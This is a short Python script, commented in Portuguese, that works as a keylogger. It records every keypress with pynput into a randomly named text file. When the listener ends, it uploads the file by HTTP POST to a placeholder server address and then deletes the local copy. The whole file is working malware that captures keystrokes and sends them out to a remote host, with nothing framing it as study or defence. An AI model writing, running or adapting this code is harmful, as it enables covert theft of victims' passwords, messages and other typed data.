from pynput.keyboard import Listener, Key
import sys
import random
import requests
import os

log = f'yek{random.randint(0,1000)}.txt'

def enviar_arquivo():
    try:
        url = 'http://IPServer:5000/upload'  # Colocar IP da maquina
        with open(log, 'rb') as f:
            files = {'file': (log, f)}
            response = requests.post(url, files=files)
            print('Arquivo enviado:', response.text)
        os.remove(log)
    except Exception as e:
        print('Erro ao enviar:', e)

def escreve_key(key):
    try:
        with open(log, 'a') as file:
            file.write(f'{str(key)}\n')
    except Exception as e:
        print('Erro ao gravar:', e)
        return False

    if key == Key.esc:
        return False  # Finaliza o listener ao apertar Esc

# Listener de teclado
with Listener(on_press=escreve_key) as logs:
    try:
        logs.join()
    except KeyboardInterrupt:
        print("Interrompido manualmente.")
    finally:
        enviar_arquivo()
